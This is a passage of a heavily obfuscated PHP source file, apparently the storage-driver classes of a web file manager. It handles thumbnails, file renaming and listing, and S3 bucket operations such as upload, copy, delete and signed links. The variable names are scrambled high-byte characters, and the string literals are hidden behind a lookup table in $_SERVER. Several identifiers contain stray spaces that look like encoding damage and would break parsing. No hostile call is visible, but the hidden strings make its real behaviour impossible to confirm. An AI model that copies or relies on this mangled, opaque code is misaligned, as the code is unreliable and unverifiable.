<= 500) { $ø†±Ÿ•õ = preg_replace($¦œÎÔ¼[204], $¦œÎÔ¼[205], $âåî›Æ[$¦œÎÔ¼[32]]); $µîõËŒí = IO::fileNameExist($¦Š–½, $ø†±Ÿ•õ); } return IO::fileOut(KodIO::make($µîõËŒí), !1, $âåî›Æ[$¦œÎÔ¼[32]]); } $êš†å¿ = IO::fileNameExist($¦Š–½, $¥ŸïßÕ); if ($êš†å¿) { return IO::fileOut(KodIO::make($êš†å¿), !1, $âåî›Æ[$¦œÎÔ¼[32]]); } if ($è˜‰‡ô» > 1000) { $this->makeImageCover($¦Š–½, $·ğ«Ü³´, $¥ŸïßÕ, $è˜‰‡ô»); $this->makeImageCover($¦Š–½, $·ğ«Ü³´, "\143\157\x76\x65\x72\x5f{$¡úÖ¯Æß}\x5f\x32\65\60\56\x70\x6e\147", 250); $êš†å¿ = IO::fileNameExist($¦Š–½, $¥ŸïßÕ); if ($êš†å¿) { return IO::fileOut(KodIO::make($êš†å¿), !1, $âåî›Æ[$¦œÎÔ¼[32]]); } die; } if (!kodIO::allowCover($âåî›Æ)) { return $this->fileOut($·ğ«Ü³´, !1, $âåî›Æ[$¦œÎÔ¼[32]]); } $›• æ = Cache::get($¥ŸïßÕ); if ($›• æ == $¦œÎÔ¼[206] || $›• æ == $¦œÎÔ¼[207]) { echo $›• æ; die; } Cache::set($¥ŸïßÕ, $¦œÎÔ¼[207], 60); $î¶Â«º‰ = array($¦Š–½, $âåî›Æ[$¦œÎÔ¼[97]], $¥ŸïßÕ, $è˜‰‡ô»); $µê¢ßÑê = $¦œÎÔ¼[208] . $âåî›Æ[$¦œÎÔ¼[89]] . $¦œÎÔ¼[209] . $¥ŸïßÕ . $¦œÎÔ¼[210] . $âåî›Æ[$¦œÎÔ¼[32]] . $¦œÎÔ¼[211] . $âåî›Æ[$¦œÎÔ¼[97]]; TaskQueue::add($¦œÎÔ¼[212], $î¶Â«º‰, $µê¢ßÑê, $¥ŸïßÕ); } public function makeImageCover($ü¼¡‰ô‡, $‘ì™é¬ã, $µÒü€”Â, $†¯ëŸ) { $ù²”œ‹» =& $_SERVER[÷ôÚîå]; if (IO::fileNameExist($ü¼¡‰ô‡, $µÒü€”Â)) { return $ù²”œ‹»[213]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $Ò¤ßµ§† = DATA_THUMB . $µÒü€”Â; del_file($Ò¤ßµ§†); $÷™Ñ‘—ó = IO::copy($‘ì™é¬ã, TEMP_FILES, !1, $µÒü€”Â); if (!@file_exists($÷™Ñ‘—ó)) { return $ù²”œ‹»[214]; } ImageThumb::createThumb($÷™Ñ‘—ó, $Ò¤ßµ§†, $†¯ëŸ, $†¯ëŸ * 10); if (@file_exists($Ò¤ßµ§†)) { Cache::remove($µÒü€”Â); return IO::move($Ò¤ßµ§†, $ü¼¡‰ô‡); } Cache::set($µÒü€”Â, $ù²”œ‹»[206], 600); del_file($Ò¤ßµ§†); return $ù²”œ‹»[215] . $÷™Ñ‘—ó . $ù²”œ‹»[84]; } public function fileOutImageServer($ïÜŞÂ¶, $‹‹ÇÅ§¹ = 250) { $this->fileOutImage($ïÜŞÂ¶, $‹‹ÇÅ§¹); } public function fileNameAuto($ıÚĞ–“, $´œ»—Û­, $­ğé€ğ = REPEAT_RENAME, $¯Šë§«• = false) { $ìÕ¦Ú• =& $_SERVER[÷ôÚîå]; $÷¶ŒÃöÙ = $ıÚĞ–“ === $ìÕ¦Ú•[12] ? $´œ»—Û­ : rtrim($ıÚĞ–“, $ìÕ¦Ú•[8]) . $ìÕ¦Ú•[8] . $´œ»—Û­; if ($­ğé€ğ == REPEAT_REPLACE || !$this->exist($÷¶ŒÃöÙ) || $¯Šë§«• && $­ğé€ğ != REPEAT_RENAME_FOLDER) { return $´œ»—Û­; } if ($­ğé€ğ == REPEAT_SKIP) { return !1; } $ÚÅÀâËĞ = $ìÕ¦Ú•[10] . get_path_ext($´œ»—Û­); $ÚÅÀâËĞ = $ÚÅÀâËĞ == $ìÕ¦Ú•[10] || $¯Šë§«• ? $ìÕ¦Ú•[12] : $ÚÅÀâËĞ; $Æà²“½œ = 1; $¢¡ßÇİ¾ = substr($´œ»—Û­, 0, strlen($´œ»—Û­) - strlen($ÚÅÀâËĞ)); $Ÿ¢‡‰Öò = $¢¡ßÇİ¾ . "\50{$Æà²“½œ}\51{$ÚÅÀâËĞ}"; while ($this->exist(rtrim($ıÚĞ–“, $ìÕ¦Ú•[8]) . $ìÕ¦Ú•[8] . $Ÿ¢‡‰Öò)) { $Ÿ¢‡‰Öò = $¢¡ßÇİ¾ . "\x28{$Æà²“½œ}\51{$ÚÅÀâËĞ}"; $Æà²“½œ++; } return $Ÿ¢‡‰Öò; } private function fileNameAutoList($´ø·»‚, $¸…ç˜Ä°, $ÜÜÀŒèù = false) { $‰…³¦Ğ× =& $_SERVER[÷ôÚîå]; $Íø¿áÖ = $this->listPath($´ø·»‚, !0); $Íø¿áÖ = array_merge($Íø¿áÖ[$‰…³¦Ğ×[95]], $Íø¿áÖ[$‰…³¦Ğ×[96]]); $€êïÄé  = array_to_keyvalue($Íø¿áÖ, $‰…³¦Ğ×[12], $‰…³¦Ğ×[32]); $¶è§’ñÃ = $‰…³¦Ğ×[10] . get_path_ext($¸…ç˜Ä°); $¶è§’ñÃ = $¶è§’ñÃ == $‰…³¦Ğ×[10] || $ÜÜÀŒèù ? $‰…³¦Ğ×[12] : $¶è§’ñÃ; $ùĞª™³ç = substr($¸…ç˜Ä°, 0, strlen($¸…ç˜Ä°) - strlen($¶è§’ñÃ)); $Ü£Šïé = $ùĞª™³ç . "\50\60\x29{$¶è§’ñÃ}"; for ($ä„óöˆÎ = 1; $ä„óöˆÎ <= count($€êïÄé ) + 1; $ä„óöˆÎ++) { $Ü£Šïé = $ùĞª™³ç . "\50{$ä„óöˆÎ}\x29{$¶è§’ñÃ}"; if (!in_array_not_case($Ü£Šïé, $€êïÄé )) { return $Ü£Šïé; } } return $Ü£Šïé; } public function listAllFiles($ËŒÛËßâ, $··æõÜ) { $‚’½¾¬ =& $_SERVER[÷ôÚîå]; if (empty($··æõÜ)) { return array(); } $¸Ô¶«Ÿë = array_keys($··æõÜ); $‚ÍÃ”²ë = array(); $ËŒÛËßâ = trim($ËŒÛËßâ, $‚’½¾¬[8]); foreach ($··æõÜ as $¾äÄ†ğ³ => $¡ô—ß”) { $€ŒåÆÉ = ltrim(substr(trim($¾äÄ†ğ³, $‚’½¾¬[8]), strlen($ËŒÛËßâ)), $‚’½¾¬[8]); if (substr($¾äÄ†ğ³, -1) == $‚’½¾¬[8]) { $€ŒåÆÉ = rtrim($€ŒåÆÉ, $‚’½¾¬[8]) . $‚’½¾¬[8]; } $‚ÍÃ”²ë = array_merge($‚ÍÃ”²ë, $this->slicePath($€ŒåÆÉ)); } $š–êäğ = array(); foreach (array_unique($‚ÍÃ”²ë) as $ˆÀ€Ò¥å) { $÷ÄÜ¦¹ = array($‚’½¾¬[97] => $this->getPathOuter($‚’½¾¬[8] . $ËŒÛËßâ . $‚’½¾¬[8] . $ˆÀ€Ò¥å), $‚’½¾¬[88] => 1, $‚’½¾¬[89] => 0); if (substr($ˆÀ€Ò¥å, -1) != $‚’½¾¬[8]) { $÷ÄÜ¦¹[$‚’½¾¬[88]] = 0; $›¾Ÿ”ù = $this->getPath($ËŒÛËßâ . $‚’½¾¬[8] . $ˆÀ€Ò¥å); if (isset($··æõÜ[$›¾Ÿ”ù])) { $”ÏéÈëĞ = $··æõÜ[$›¾Ÿ”ù]; if (isset($”ÏéÈëĞ[$‚’½¾¬[89]])) { $÷ÄÜ¦¹[$‚’½¾¬[89]] = intval($”ÏéÈëĞ[$‚’½¾¬[89]]); } if (isset($”ÏéÈëĞ[$‚’½¾¬[216]])) { $÷ÄÜ¦¹[$‚’½¾¬[98]] = intval($”ÏéÈëĞ[$‚’½¾¬[216]]); } } } $š–êäğ[] = $÷ÄÜ¦¹; } return $š–êäğ; } public function slicePath($à¹‘ø»‰) { $åø±ÒĞæ =& $_SERVER[÷ôÚîå]; $Å×íˆÙâ = explode($åø±ÒĞæ[8], trim($à¹‘ø»‰, $åø±ÒĞæ[8])); $±—°æ¥Ù = 0; do { ++$±—°æ¥Ù; $ıÙÈşœ…[] = implode($åø±ÒĞæ[8], array_slice($Å×íˆÙâ, 0, $±—°æ¥Ù)) . $åø±ÒĞæ[8]; } while ($±—°æ¥Ù < count($Å×íˆÙâ)); $ıÙÈşœ…[count($Å×íˆÙâ) - 1] = $à¹‘ø»‰; return $ıÙÈşœ…; } public function getHost() { $øªäø¤× =& $_SERVER[÷ôÚîå]; $€ÖĞõÍÌ = parse_url(trim($this->domain, $øªäø¤×[8])); $½Óäíƒª = isset($€ÖĞõÍÌ[$øªäø¤×[217]]) ? $€ÖĞõÍÌ[$øªäø¤×[217]] : http_type(); $Í—°à‘´ = isset($€ÖĞõÍÌ[$øªäø¤×[218]]) ? $€ÖĞõÍÌ[$øªäø¤×[218]] : $€ÖĞõÍÌ[$øªäø¤×[97]]; if (isset($€ÖĞõÍÌ[$øªäø¤×[219]])) { $Í—°à‘´ .= $øªäø¤×[4] . $€ÖĞõÍÌ[$øªäø¤×[219]]; } return $½Óäíƒª . $øªäø¤×[220] . $Í—°à‘´; } public function pathEncode($ÏôªûóŞ) { $”ĞÊÙš™ =& $_SERVER[÷ôÚîå]; return str_replace($”ĞÊÙš™[221], $”ĞÊÙš™[8], rawurlencode($ÏôªûóŞ)); } public function writeLog($³÷“ç‡› = '', $¼Õºšş = false) { $†œÆùé› =& $_SERVER[÷ôÚîå]; $Ş·Š”Şô = in_array(ACTION, array($†œÆùé›[222], $†œÆùé›[223])); if (!$Ş·Š”Şô && !GLOBAL_DEBUG) { return; } $†Ù‚¸éÀ = $³÷“ç‡›; static $Ä÷¹ÒÕ¶ = null; if (!$Ä÷¹ÒÕ¶) { $Ä÷¹ÒÕ¶ = strtoupper($this->getType()); } $³÷“ç‡› = $Ä÷¹ÒÕ¶ . $†œÆùé›[224] . $³÷“ç‡›; if ($¼Õºšş) { $ÉêÊ ‰Â = error_get_last(); if ($ÉêÊ ‰Â) { $³÷“ç‡› = array($³÷“ç‡›, $ÉêÊ ‰Â); } } write_log($³÷“ç‡›, $†œÆùé›[225]); if ($Ş·Š”Şô) { throw new Exception($†Ù‚¸éÀ); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($Ãò‘Ù) { set_timeout(); require_once SDK_DIR . $_SERVER[÷ôÚîå][226]; parent::__construct(); $this->_init($Ãò‘Ù); } public function _init($‰‹•ÉÒ—) { $ŸšÔÌû =& $_SERVER[÷ôÚîå]; $this->config = $‰‹•ÉÒ—; foreach ($‰‹•ÉÒ— as $¯¿¯ì–ß => $ù‚Òòî¸) { if (isset($this->{$¯¿¯ì–ß})) { $this->{$¯¿¯ì–ß} = $ù‚Òòî¸; } } $this->endpoint = $‰‹•ÉÒ—[$ŸšÔÌû[227]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); if (in_array(ACTION, array($ŸšÔÌû[222], $ŸšÔÌû[223]))) { $this->client->setExceptions(); } } public function setSignVersion($‡ì§¸„Í = "\x76\x34") { $this->signVer = $‡ì§¸„Í; $this->client->setSignatureVersion($‡ì§¸„Í); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $Üµ¢§Êâ) { return null; } } public function isBucketCors() { $¶ÍËòÍ· =& $_SERVER[÷ôÚîå]; $Ô™òô ´ = $this->getBucketCors(); if (!$Ô™òô ´ || !is_array($Ô™òô ´)) { return !1; } if (!is_array($Ô™òô ´[$¶ÍËòÍ·[228]])) { $Ô™òô ´[$¶ÍËòÍ·[228]] = explode($¶ÍËòÍ·[50], $Ô™òô ´[$¶ÍËòÍ·[228]]); } if ($Ô™òô ´[$¶ÍËòÍ·[229]] != $¶ÍËòÍ·[230] || !in_array($¶ÍËòÍ·[230], $Ô™òô ´[$¶ÍËòÍ·[228]])) { return !1; } $á½ÕÔï‚ = array_map($¶ÍËòÍ·[231], $Ô™òô ´[$¶ÍËòÍ·[232]]); if (!is_array($á½ÕÔï‚)) { $á½ÕÔï‚ = array(); } $í©Ûã„ = array($¶ÍËòÍ·[233], $¶ÍËòÍ·[234], $¶ÍËòÍ·[235], $¶ÍËòÍ·[236], $¶ÍËòÍ·[237]); $º‡ò„™¤ = array_diff($í©Ûã„, $á½ÕÔï‚); return empty($º‡ò„™¤); } public function getBucketRgn() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($ò±çç³›, $ò‹Ï¿®Ë = '', $“õ«Ø¸ = REPEAT_RENAME) { $°¾É½© = $this->setContent($ò±çç³›, $ò‹Ï¿®Ë); if ($°¾É½© !== !1) { return $this->getPathOuter($ò±çç³›); } return !1; } public function mkdir($ş„ ‡ı, $„êÒ£ñ‹ = REPEAT_SKIP) { $¤ÊÄÒ¢¤ =& $_SERVER[÷ôÚîå]; if (empty($ş„ ‡ı) && $ş„ ‡ı !== $¤ÊÄÒ¢¤[238]) { return !1; } if ($„êÒ£ñ‹ && $this->_isFolder($ş„ ‡ı)) { return $this->getPathOuter($ş„ ‡ı); } $…”Í¶¦ı = $this->setContent($ş„ ‡ı, $¤ÊÄÒ¢¤[12], !0); if ($…”Í¶¦ı !== !1) { return $this->getPathOuter($ş„ ‡ı); } return !1; } public function copyFile($‚‰°êùå, $ÃÅèƒÄ™, $×—á¶™ = array()) { $ÊÓˆ°ˆ¨ =& $_SERVER[÷ôÚîå]; $ö¨¾ÓÁ = $this->objectMeta($‚‰°êùå); if (!$ö¨¾ÓÁ) { return !1; } if ($ö¨¾ÓÁ[$ÊÓˆ°ˆ¨[89]] <= 1024 * 1024 * 200) { $ÃÄŒŠä¯ = $this->client->copyObject($this->bucket, $‚‰°êùå, $this->bucket, $ÃÅèƒÄ™, $ÊÓˆ°ˆ¨[239], $×—á¶™); } else { $ÃÄŒŠä¯ = $this->client->multiCopyObject($this->bucket, $‚‰°êùå, $this->bucket, $ÃÅèƒÄ™, $×—á¶™); } $ÃÄŒŠä¯ = $ÃÄŒŠä¯ ? $this->getPathOuter($ÃÅèƒÄ™) : !1; return $ÃÄŒŠä¯; } public function moveFile($á¿„Â­, $³îª¨åå) { if ($this->copyFile($á¿„Â­, $³îª¨åå)) { $this->delFile($á¿„Â­); return $this->getPathOuter($³îª¨åå); } return !1; } public function delFile($Âéğ˜’‡) { return $this->client->deleteObject($this->bucket, $Âéğ˜’‡); } public function delFolder($ÎÌñ©³ò) { $ó­¼— =& $_SERVER[÷ôÚîå]; if (!$this->exist($ÎÌñ©³ò)) { return !0; } $this->listItemCache = !1; $†ìÂ›»œ = $this->fileList($ÎÌñ©³ò); $this->listItemCache = !0; $ê±ò¨›ñ = trim($ÎÌñ©³ò, $ó­¼—[8]) . $ó­¼—[8]; if (!empty($ÎÌñ©³ò) && $ÎÌñ©³ò !== $ó­¼—[238] && !in_array($ê±ò¨›ñ, $†ìÂ›»œ[$ó­¼—[95]])) { $†ìÂ›»œ[$ó­¼—[95]][] = $ê±ò¨›ñ; } $°ÅßˆÉù = $this->delByBatch($†ìÂ›»œ[$ó­¼—[96]]); if (!$°ÅßˆÉù) { return !1; } $°ÅßˆÉù = $this->delByBatch($†ìÂ›»œ[$ó­¼—[95]]); if (!$°ÅßˆÉù) { return !1; } return $this->delFile($ê±ò¨›ñ); } private function delByBatch($òÏàÂÔÖ) { foreach (array_chunk($òÏàÂÔÖ, 1000) as $ÛÑÎ¡‘¡) { $¤¯»µ„í = $this->client->deleteObjects($this->bucket, $ÛÑÎ¡‘¡); if (!$¤¯»µ„í) { return !1; } } return !0; } public function rename($˜şÀˆø, $Ìà¡š›) { return $this->renameObject($˜şÀˆø, $Ìà¡š›); } public function listPath($µÕò™üµ, $Êù±±é· = false) { $’ÃüŒ£ =& $_SERVER[÷ôÚîå]; $ÑÀ’­Áú = $this->fileList($µÕò™üµ, $’ÃüŒ£[8], !0); foreach ($ÑÀ’­Áú[$’ÃüŒ£[95]] as $ÅÛ¾Áœ” => $¨­›ú”) { $ÑÀ’­Áú[$’ÃüŒ£[95]][$ÅÛ¾Áœ”] = $this->folderInfo($¨­›ú”, $Êù±±é·, $¨­›ú”); } foreach ($ÑÀ’­Áú[$’ÃüŒ£[96]] as $ÅÛ¾Áœ” => $¨­›ú”) { $ÑÀ’­Áú[$’ÃüŒ£[96]][$ÅÛ¾Áœ”] = $this->fileInfo($¨­›ú”[$’ÃüŒ£[32]], $Êù±±é·, $¨­›ú”); } return $ÑÀ’­Áú; } protected function infoChildren($Ä®©Á´°, &$Ì³ïŠı¦) { $ù­àÓ”— =& $_SERVER[÷ôÚîå]; $¬Ú¼š ” = $this->fileList($Ä®©Á´°, $ù­àÓ”—[12], !0); $Ì³ïŠı¦[$ù­àÓ”—[91]] += count($¬Ú¼š ”[$ù­àÓ”—[95]]); $Ì³ïŠı¦[$ù­àÓ”—[90]] += count($¬Ú¼š ”[$ù­àÓ”—[96]]); foreach ($¬Ú¼š ”[$ù­àÓ”—[96]] as $œÙŞË) { if (!$œÙŞË || !$œÙŞË[$ù­àÓ”—[89]]) { continue; } $Ì³ïŠı¦[$ù­àÓ”—[89]] += $œÙŞË[$ù­àÓ”—[89]]; } } private function fileInfo($ùÅĞé¹„, $•í’‘ğ = false, $ä–íëü÷ = array()) { $‰’¶–ÈÃ =& $_SERVER[÷ôÚîå]; $ øñõª¬ = array($‰’¶–ÈÃ[32] => $this->pathThis($ùÅĞé¹„), $‰’¶–ÈÃ[97] => $this->getPathOuter($ùÅĞé¹„), $‰’¶–ÈÃ[33] => $‰’¶–ÈÃ[240], $‰’¶–ÈÃ[179] => $this->ext($ùÅĞé¹„), $‰’¶–ÈÃ[89] => isset($ä–íëü÷[$‰’¶–ÈÃ[89]]) ? $ä–íëü÷[$‰’¶–ÈÃ[89]] : 0); if ($•í’‘ğ) { return $ øñõª¬; } $ øñõª¬[$‰’¶–ÈÃ[241]] = $ øñõª¬[$‰’¶–ÈÃ[98]] = 0; $ øñõª¬[$‰’¶–ÈÃ[242]] = $ øñõª¬[$‰’¶–ÈÃ[243]] = !0; if (empty($ä–íëü÷)) { $ä–íëü÷ = $this->objectMeta($ùÅĞé¹„); if (!$ä–íëü÷) { return $ øñõª¬; } } if (isset($ä–íëü÷[$‰’¶–ÈÃ[244]]) && $ä–íëü÷[$‰’¶–ÈÃ[244]]) { $ øñõª¬[$‰’¶–ÈÃ[245]] = $ä–íëü÷[$‰’¶–ÈÃ[244]]; } if (isset($ä–íëü÷[$‰’¶–ÈÃ[216]])) { $ øñõª¬[$‰’¶–ÈÃ[98]] = $ä–íëü÷[$‰’¶–ÈÃ[216]]; } if (isset($ä–íëü÷[$‰’¶–ÈÃ[89]])) { $ øñõª¬[$‰’¶–ÈÃ[89]] = $ä–íëü÷[$‰’¶–ÈÃ[89]]; } return $ øñõª¬; } private function folderInfo($û˜•Íõµ, $–ÑœÆÅä = false, $º½éáŒĞ = array()) { $»ú÷ÀÖñ =& $_SERVER[÷ôÚîå]; $ùòŒşÍõ = array($»ú÷ÀÖñ[32] => $this->pathThis($û˜•Íõµ), $»ú÷ÀÖñ[97] => $this->getPathOuter($»ú÷ÀÖñ[8] . $û˜•Íõµ), $»ú÷ÀÖñ[33] => $»ú÷ÀÖñ[88]); if ($–ÑœÆÅä) { return $ùòŒşÍõ; } $ùòŒşÍõ[$»ú÷ÀÖñ[241]] = $ùòŒşÍõ[$»ú÷ÀÖñ[98]] = 0; $ùòŒşÍõ[$»ú÷ÀÖñ[242]] = $ùòŒşÍõ[$»ú÷ÀÖñ[243]] = !0; if ($û˜•Íõµ == $»ú÷ÀÖñ[12]) { return $ùòŒşÍõ; } if (empty($º½éáŒĞ)) { $º½éáŒĞ = $this->objectMeta(trim($û˜•Íõµ, $»ú÷ÀÖñ[8]) . $»ú÷ÀÖñ[8]); } if (isset($º½éáŒĞ[$»ú÷ÀÖñ[216]])) { $ùòŒşÍõ[$»ú÷ÀÖñ[241]] = $º½éáŒĞ[$»ú÷ÀÖñ[216]]; } return $ùòŒşÍõ; } private function fileList($ÉŞ¨µÑ”, $ñÎ™òœ = '', $ÅóÖµŠ® = 0) { $Š‹ïŒµï =& $_SERVER[÷ôÚîå]; $›ı¨ò™ = rtrim($ÉŞ¨µÑ”, $Š‹ïŒµï[8]) . $Š‹ïŒµï[8]; $¸¤éÕä¢ = $this->listObjs($›ı¨ò™, null, null, $ñÎ™òœ); if (!$¸¤éÕä¢) { return array($Š‹ïŒµï[95] => array(), $Š‹ïŒµï[96] => array()); } $…öûƒ„ = $º±»Ï¹á = array(); foreach ($¸¤éÕä¢[$Š‹ïŒµï[246]] as $Ù™‡–º¼) { $‘·»´É = $Ù™‡–º¼[$Š‹ïŒµï[32]]; if ($‘·»´É == $›ı¨ò™) { continue; } $ßëÙú»Ÿ = isset($Ù™‡–º¼[$Š‹ïŒµï[89]]) ? $Ù™‡–º¼[$Š‹ïŒµï[89]] : 0; $õ¼ıØó = $ßëÙú»Ÿ == 0 && substr($‘·»´É, strlen($‘·»´É) - 1, 1) == $Š‹ïŒµï[8] ? !0 : !1; $this->cacheMethodInfoSet($‘·»´É, $õ¼ıØó, $Ù™‡–º¼); if ($õ¼ıØó) { $…öûƒ„[] = $‘·»´É; continue; } $º±»Ï¹á[] = $ÅóÖµŠ® ? $Ù™‡–º¼ : $‘·»´É; } foreach ($¸¤éÕä¢[$Š‹ïŒµï[247]] as $Ù™‡–º¼) { $…öûƒ„[] = $Ù™‡–º¼[$Š‹ïŒµï[32]]; $this->cacheMethodInfoSet($Ù™‡–º¼[$Š‹ïŒµï[32]], !0); } $this->cacheMethodInfoSet($ÉŞ¨µÑ”, !0); return array($Š‹ïŒµï[95] => $…öûƒ„, $Š‹ïŒµï[96] => $º±»Ï¹á); } private function listObjs($¼üüËüÔ, $Ç´“¾ïÇ = null, $ÁÒ×ğ¦Ú = null, $‡ìÖªÉˆ = null) { $÷ËÜÚ²è =& $_SERVER[÷ôÚîå]; $¼üüËüÔ = trim($¼üüËüÔ, $÷ËÜÚ²è[8]); $à§Âß¥ = empty($¼üüËüÔ) && $¼üüËüÔ !== $÷ËÜÚ²è[238] ? $÷ËÜÚ²è[12] : $¼üüËüÔ . $÷ËÜÚ²è[8]; return $this->client->getBucket($this->bucket, $à§Âß¥, $Ç´“¾ïÇ, $ÁÒ×ğ¦Ú, $‡ìÖªÉˆ, !0); } public function has($¡ëÀã‘, $ğƒ¦ÁÉï = false, $ô÷”Í¡« = true) { $ÚïĞÓî =& $_SERVER[÷ôÚîå]; $¡ëÀã‘ = trim($¡ëÀã‘, $ÚïĞÓî[8]); $ôİ»ĞÏ´ = empty($¡ëÀã‘) && $¡ëÀã‘ !== $ÚïĞÓî[238] ? $ÚïĞÓî[12] : $¡ëÀã‘ . $ÚïĞÓî[8]; $–¶×ê» = null; $ëüûŠÇ÷ = 500; $ÅƒµöûÎ = $ÚïĞÓî[8]; $¤Œ¸½« = $ÅÅ†³ñ¹ = array(); while (!0) { $«Ô¶ÍÌ = $this->listObjs($¡ëÀã‘, $–¶×ê», $ëüûŠÇ÷, $ÅƒµöûÎ); if (!$«Ô¶ÍÌ) { break; } $–¶×ê» = $«Ô¶ÍÌ[$ÚïĞÓî[248]]; $ó£­¥§À = $«Ô¶ÍÌ[$ÚïĞÓî[246]]; $„óãµ¾À = $«Ô¶ÍÌ[$ÚïĞÓî[247]]; if (empty($ó£­¥§À) && empty($„óãµ¾À)) { break; } if (count($ó£­¥§À) == 1 && $ó£­¥§À[0][$ÚïĞÓî[32]] == $ôİ»ĞÏ´) { break; } if ($ğƒ¦ÁÉï) { if (count($ó£­¥§À)) { $ó£­¥§À = array_column($ó£­¥§À, $ÚïĞÓî[32]); $¤Œ¸½« = array_merge($¤Œ¸½«, $ó£­¥§À); } if (count($„óãµ¾À)) { $„óãµ¾À = array_column($„óãµ¾À, $ÚïĞÓî[32]); $ÅÅ†³ñ¹ = array_merge($ÅÅ†³ñ¹, $„óãµ¾À); } if ($–¶×ê» === null) { break; } continue; } if ($ô÷”Í¡«) { if (!empty($ó£­¥§À)) { if (count($ó£­¥§À) > 1 || isset($ó£­¥§À[0][$ÚïĞÓî[32]]) && $ó£­¥§À[0][$ÚïĞÓî[32]] != $ôİ»ĞÏ´) { return !0; } } } else { if (!empty($„óãµ¾À)) { return !0; } } if ($–¶×ê» === null) { break; } } if ($ğƒ¦ÁÉï) { $¤Œ¸½« = array_diff($¤Œ¸½«, array($ôİ»ĞÏ´)); $¤Œ¸½« = count(array_unique($¤Œ¸½«)); $ÅÅ†³ñ¹ = count(array_unique($ÅÅ†³ñ¹)); return array($ÚïĞÓî[249] => $¤Œ¸½«, $ÚïĞÓî[250] => $ÅÅ†³ñ¹); } return !1; } public function listAll($”¬şª•) { $×óá†éş =& $_SERVER[÷ôÚîå]; $ğ—ºµ¦Ğ = $this->fileList($”¬şª•, $×óá†éş[12], !0); $ƒùéëÔÙ = array_to_keyvalue($ğ—ºµ¦Ğ[$×óá†éş[96]], $×óá†éş[32]); foreach ($ğ—ºµ¦Ğ[$×óá†éş[95]] as $½Ï³¹úÔ) { if (is_string($½Ï³¹úÔ)) { $ƒùéëÔÙ[$½Ï³¹úÔ] = array($×óá†éş[89] => 0); } } return $this->listAllFiles($”¬şª•, $ƒùéëÔÙ); } public function canRead($úäÚ®‘á) { $ù¹ÚÒç© =& $_SERVER[÷ôÚîå]; $ïÍşëìŒ = $this->client->getAccessControlPolicy($this->bucket, $úäÚ®‘á); if (!$ïÍşëìŒ) { return !1; } return in_array($ïÍşëìŒ, array($ù¹ÚÒç©[251], $ù¹ÚÒç©[252], $ù¹ÚÒç©[253])) ? !0 : !1; } public function canWrite($ì‰¢½Œõ) { $î±Àè™ =& $_SERVER[÷ôÚîå]; $µÛœÄ‡ = $this->client->getAccessControlPolicy($this->bucket, $ì‰¢½Œõ); if (!$µÛœÄ‡) { return !1; } return in_array($µÛœÄ‡, array($î±Àè™[251], $î±Àè™[252])) ? !0 : !1; } public function getContent($„¥ĞÊæâ) { return $this->client->getObject($this->bucket, $„¥ĞÊæâ); } public function setContent($¦×ªêø , $Ãµ‹ğÙÌ = '', $¤•¡ï·Ü = false) { $‚ë©ğš¤ =& $_SERVER[÷ôÚîå]; $¦×ªêø  = $¤•¡ï·Ü ? trim($¦×ªêø , $‚ë©ğš¤[8]) . $‚ë©ğš¤[8] : $¦×ªêø ; $©í“·ÌÅ = get_file_mime(get_path_ext($¦×ªêø )); $·†Óº•„ = $this->client->putObject($Ãµ‹ğÙÌ, $this->bucket, $¦×ªêø , $‚ë©ğš¤[239], array(), $©í“·ÌÅ); if (!$·†Óº•„) { return !1; } if ($¤•¡ï·Ü) { return !0; } return $·†Óº•„ ? !0 : !1; } public function fileSubstr($Ô—‰±, $š‡†‹†ß, $’±Åé…) { $ˆšªü³‰ = $š‡†‹†ß + $’±Åé… - 1; return $this->client->getObject($this->bucket, $Ô—‰±, array($_SERVER[÷ôÚîå][254] => "\142\x79\164\145\x73\x3d{$š‡†‹†ß}\x2d{$ˆšªü³‰}")); } public function upload($Î¬‚ß‹, $¸¼ûè ö, $ö÷Ùş¿¿ = false, $¦ÊÛ‰±Ú = REPEAT_REPLACE) { $ë²Í–ªë =& $_SERVER[÷ôÚîå]; $ÈˆÍ”±Ù = array($ë²Í–ªë[255] => @md5_file($¸¼ûè ö)); $¨Ÿ¥›êÙ = array($ë²Í–ªë[256] => get_file_mime(get_path_ext($Î¬‚ß‹))); if (IO::size($¸¼ûè ö) <= 1024 * 1024 * 200) { $ÆïĞ†œ = $this->client->putObjectFile($¸¼ûè ö, $this->bucket, $Î¬‚ß‹, $ë²Í–ªë[239], $ÈˆÍ”±Ù, $¨Ÿ¥›êÙ); return !empty($ÆïĞ†œ) ? $this->getPathOuter($Î¬‚ß‹) : !1; } $¡ÎÅ·ºÆ = $this->client->multiUploadObject($¸¼ûè ö, $this->bucket, trim($Î¬‚ß‹, $ë²Í–ªë[8]), $ÈˆÍ”±Ù, $¨Ÿ¥›êÙ); return $¡ÎÅ·ºÆ ? $this->getPathOuter($Î¬‚ß‹) : !1; } public function download($¥Ï‰Ó…Ê, $ªÌşƒ”Õ) { if (!@is_dir($this->pathFather($ªÌşƒ”Õ)) && !IO::mkdir($this->pathFather($ªÌşƒ”Õ))) { return !1; } $ù¹¨–È© = $this->client->getObject($this->bucket, $¥Ï‰Ó…Ê, array(), $ªÌşƒ”Õ); return $ù¹¨–È© !== !1 ? $ªÌşƒ”Õ : !1; } public function link($ˆ˜í“”œ, $ãÙä¶¯ = array()) { $‘®å‰“Ö =& $_SERVER[÷ôÚîå]; if ($this->signVer == $‘®å‰“Ö[257]) { return $this->client->getAuthenticatedURL($this->bucket, $ˆ˜í“”œ, 3600 * 12, $ãÙä¶¯); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($ˆ˜í“”œ, $‘®å‰“Ö[8]), 3600 * 12, $this->region, array(), !0, $ãÙä¶¯); } public function fileOut($Æ§˜×ùí, $Ñ€ïüÚ– = false, $‚ìşæ¨ = false, $„“Éñ‡– = '') { $“ÒÙÔ‰ =& $_SERVER[÷ôÚîå]; if ($this->isFileOutServer()) { return 